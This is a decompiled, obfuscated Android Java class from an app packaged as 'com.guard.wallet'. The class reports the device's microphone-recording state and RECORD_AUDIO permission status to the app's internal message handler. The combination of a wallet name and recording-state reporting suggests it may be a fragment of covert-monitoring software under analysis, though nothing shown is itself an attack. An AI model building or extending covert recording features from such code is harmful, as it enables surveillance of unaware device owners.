package p007j;

import android.support.v4.content.ContextCompat;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.DeviceRecordStateVO;
import com.guard.wallet.utils.AbstractC0251g;

/* renamed from: j.a */
/* loaded from: classes.dex */
public final class RunnableC0346a implements Runnable {

    /* renamed from: a */
    public final /* synthetic */ EnumC0348c f662a;

    /* renamed from: b */
    public final /* synthetic */ String f663b;

    /* renamed from: c */
    public final /* synthetic */ C0349d f664c;

    public RunnableC0346a(C0349d c0349d, EnumC0348c enumC0348c, String str) {
        this.f664c = c0349d;
        this.f662a = enumC0348c;
        this.f663b = str;
    }

    @Override // java.lang.Runnable
    public final void run() {
        this.f664c.f685i.getClass();
        DeviceRecordStateVO deviceRecordStateVO = new DeviceRecordStateVO();
        deviceRecordStateVO.setState(this.f662a);
        deviceRecordStateVO.setMessage(this.f663b);
        C0349d.m881b().getClass();
        deviceRecordStateVO.setAllowRecord(Integer.valueOf((AbstractC0251g.m653Z() == null || ContextCompat.checkSelfPermission(AbstractC0251g.m653Z(), "android.permission.RECORD_AUDIO") != 0) ? 0 : 1));
        deviceRecordStateVO.setAudioSource(Integer.valueOf(C0349d.m881b().f686j));
        MessageRecordVO messageRecordVO = new MessageRecordVO();
        messageRecordVO.setExtraBody(deviceRecordStateVO);
        messageRecordVO.setIntentCode("android.intent.action.RECORD_STATE");
        MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
    }
}
